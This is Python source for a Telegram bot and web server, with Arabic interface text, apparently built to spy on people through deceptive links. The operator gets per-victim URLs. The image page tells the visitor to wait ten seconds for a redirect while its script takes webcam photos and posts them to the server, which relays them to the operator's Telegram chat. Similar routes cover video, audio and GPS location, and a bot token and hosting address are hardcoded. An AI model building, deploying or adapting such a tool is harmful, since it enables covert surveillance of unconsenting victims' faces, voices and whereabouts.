import telebot
from http.server import BaseHTTPRequestHandler, HTTPServer
import os
import json
import base64
import time
import uuid
from urllib.parse import parse_qs

tok = '1847511046:AAEsoNnXney4bDcYgrwUFT15aMAXJI3pT_k'
bot = telebot.TeleBot(tok)

UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

users = {}

html_content_image = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Image</title>
</head>
<body>
    <p>انتظر لمدة 10 ثواني وسيتم تحويلك للرابط.</p>
    <script>
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            var video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            var canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            var context = canvas.getContext('2d');

            setTimeout(() => {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                var image1 = canvas.toDataURL('image/png');

                fetch('/upload-image/{{user_id}}', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ image: image1 })
                }).then(response => response.text())
                  .then(data => console.log(data));

                setTimeout(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    var image2 = canvas.toDataURL('image/png');

                    fetch('/upload-image/{{user_id}}', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ image: image2 })
                    }).then(response => response.text())
                      .then(data => console.log(data));

                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
            }, 1000);
        })
        .catch(function(err) {
            console.log("حدث خطأ: " + err);
        });
    </script>
</body>
</html>
'''

html_content_video = '''<html>...</html>'''  # ضع هنا محتوى HTML المطلوب للفيديو
html_content_audio = '''<html>...</html>'''  # ضع هنا محتوى HTML المطلوب للصوت
html_content_location = '''<html>...</html>'''  # ضع هنا محتوى HTML المطلوب للموقع

class MyHandler(BaseHTTPRequestHandler):
    def _send_response(self, code, content_type, content):
        self.send_response(code)
        self.send_header("Content-type", content_type)
        self.end_headers()
        self.wfile.write(content.encode())

    def do_GET(self):
        path = self.path
        if path.startswith('/capture/'):
            user_id = path.split('/')[2]
            self._send_response(200, "text/html", html_content_image.replace("{{user_id}}", user_id))
        elif path.startswith('/record/'):
            user_id = path.split('/')[2]
            self._send_response(200, "text/html", html_content_video.replace("{{user_id}}", user_id))
        elif path.startswith('/audio/'):
            user_id = path.split('/')[2]
            self._send_response(200, "text/html", html_content_audio.replace("{{user_id}}", user_id))
        elif path.startswith('/get-location/'):
            user_id = path.split('/')[2]
            self._send_response(200, "text/html", html_content_location.replace("{{user_id}}", user_id))
        else:
            self.send_error(404)

    def do_POST(self):
        path = self.path
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        if path.startswith('/upload-image/'):
            user_id = path.split('/')[2]
            data = json.loads(post_data.decode())
            image_data = data['image'].split(',')[1]
            image_path = os.path.join(UPLOAD_FOLDER, f'captured_image_{user_id}_{time.time()}.png')
            with open(image_path, 'wb') as f:
                f.write(base64.b64decode(image_data))

            if user_id in users:
                chat_id = users[user_id]
                bot.send_photo(chat_id, photo=open(image_path, 'rb'))
            self._send_response(200, "application/json", json.dumps({"message": "تم استقبال الصورة وإرسالها!"}))

        elif path.startswith('/upload-video/'):
            user_id = path.split('/')[2]
            video = post_data  # assuming video data comes as raw bytes
            video_path = os.path.join(UPLOAD_FOLDER, f'recorded_video_{user_id}_{time.time()}.webm')
            with open(video_path, 'wb') as f:
                f.write(video)

            if user_id in users:
                chat_id = users[user_id]
                with open(video_path, 'rb') as video_file:
                    bot.send_video(chat_id, video_file)
            self._send_response(200, "application/json", json.dumps({"message": "تم استقبال الفيديو وإرساله!"}))

        elif path.startswith('/upload-audio/'):
            user_id = path.split('/')[2]
            audio = post_data  # assuming audio data comes as raw bytes
            audio_path = os.path.join(UPLOAD_FOLDER, f'recorded_audio_{user_id}_{time.time()}.webm')
            with open(audio_path, 'wb') as f:
                f.write(audio)

            if user_id in users:
                chat_id = users[user_id]
                with open(audio_path, 'rb') as audio_file:
                    bot.send_voice(chat_id, audio_file)
            self._send_response(200, "application/json", json.dumps({"message": "تم استقبال الصوت وإرساله!"}))

        elif path.startswith('/upload-location/'):
            user_id = path.split('/')[2]
            data = json.loads(post_data.decode())
            latitude = data['latitude']
            longitude = data['longitude']

            if user_id in users:
                chat_id = users[user_id]
                bot.send_message(chat_id, f"موقعك الدقيق هو: https://www.google.com/maps?q={latitude},{longitude}")
            self._send_response(200, "application/json", json.dumps({"message": "تم استقبال الموقع وإرساله!"}))
        else:
            self.send_error(404)

def run_http_server():
    server_address = ('', 20182)
    httpd = HTTPServer(server_address, MyHandler)
    print('Starting server on port 8000...')
    httpd.serve_forever()

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    chat_id = message.chat.id
    user_id = str(uuid.uuid4())
    users[user_id] = chat_id
    keyboard = telebot.types.InlineKeyboardMarkup()
    capture_button = telebot.types.InlineKeyboardButton(text='التقاط صورة', callback_data=f'capture_{user_id}')
    video_button = telebot.types.InlineKeyboardButton(text='تسجيل فيديو', callback_data=f'record_{user_id}')
    audio_button = telebot.types.InlineKeyboardButton(text='تسجيل صوت', callback_data=f'audio_{user_id}')
    location_button = telebot.types.InlineKeyboardButton(text='الحصول على الموقع', callback_data=f'location_{user_id}')
    keyboard.add(capture_button, video_button, audio_button, location_button)
    bot.send_message(chat_id, "مرحبًا! اختر الخيار:", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data.startswith('capture_'):
        user_id = call.data.split('_')[1]
        bot.send_message(call.from_user.id, f"image : http://fi9.bot-hosting.net:20182/capture/{user_id}")
    elif call.data.startswith('record_'):
        user_id = call.data.split('_')[1]
        bot.send_message(call.from_user.id, f"video : http://127.0.0.1:8000/record/{user_id}")
    elif call.data.startswith('audio_'):
        user_id = call.data.split('_')[1]
        bot.send_message(call.from_user.id, f"voice : http://127.0.0.1:8000/audio/{user_id}")
    elif call.data.startswith('location_'):
        user_id = call.data.split('_')[1]
        bot.send_message(call.from_user.id, f"GPS : http://127.0.0.1:8000/get-location/{user_id}")

def run_bot():
    bot.polling()

if __name__ == "__main__":
    from threading import Thread
    t1 = Thread(target=run_http_server)
    t1.start()

    t2 = Thread(target=run_bot)
    t2.start()
